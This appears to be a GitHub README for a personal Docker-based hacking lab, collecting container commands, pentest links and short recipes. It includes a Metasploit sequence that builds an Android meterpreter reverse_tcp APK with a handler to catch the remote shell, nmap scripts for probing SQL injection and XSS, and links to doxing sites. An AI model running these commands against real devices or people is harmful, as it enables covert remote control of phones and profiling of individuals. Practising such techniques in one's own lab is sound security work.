Docker Hacklab
===

> My personal hacklab

Quick Start
---

```bash
# Run Hacklab
docker run -d --name hacklab --net=host --privileged -it jcherqui/docker-hacklab

# Vuln Scanners
docker run -d --name nessus -p 8834:8834 infoslack/nessus
docker run -d --name openvas -p 443:443 -p 9390:9390 -p 9391:9391 mikesplain/openvas
```

Doxing/OSINT
---

- http://www.peekyou.com/
- https://pipl.com/

Cheat Sheet
---

- http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

Autopwn
---

https://github.com/ngalongc/AutoLocalPrivilegeEscalation

ClickJacking
---

https://samy.pl/quickjack/

Android
---

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> R > FILENAME.apk
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST <ip> *
set LPORT <port>
exploit -j
```

https://android.fallible.co/

NMAP
---

nmap -Pn --script=dns-brute <host> # Find subdomains of a website
nmap -Pn --script=mysql-info <host> # Find mysql version
nmap -Pn --script=http-sitenap-generator <host> # Display directory structure
nmap -sV --script=vulscan <host> # Display vuln
nmap -sV --script-args vulnscandb=exploit <host> # //
nmap -Pn --script=http-xssed <host> # Search on xssed.com if XSS vulnerability
nmap -sV  –script=http-sql-injection <host> # Test injection SQL

TOP Channels youtube
---

https://www.youtube.com/user/Hak5Darren/videos
https://www.youtube.com/user/DEFCONConference/videos
https://www.youtube.com/user/BlackHatOfficialYT/videos
https://www.youtube.com/user/JackkTutorials/videos
https://www.youtube.com/channel/UCO51Z4c1R8EPHZioGwgBmDw/videos
https://www.youtube.com/playlist?list=PLkRo97mCIn9lgvE7AskNsmwJVOlJX2zaI
https://www.youtube.com/channel/UC286ntgASMskhPIJQebJVvA/videos
https://www.youtube.com/user/gaytony10/playlists
https://www.youtube.com/user/bhargavtandel/videos

Links
---

- https://www.exploit-db.com/
- http://sectools.org/
- http://pwnwiki.io/
- https://www.cybrary.it/
- http://null-byte.wonderhowto.com/
- https://github.com/enaqx/awesome-pentest
- https://github.com/Hack-with-Github/Awesome-Hacking
- https://github.com/sindresorhus/awesome#security
- https://github.com/gchq/CyberChef
- https://hackademics.fr

License
---

MIT

Free Software, Hell Yeah !
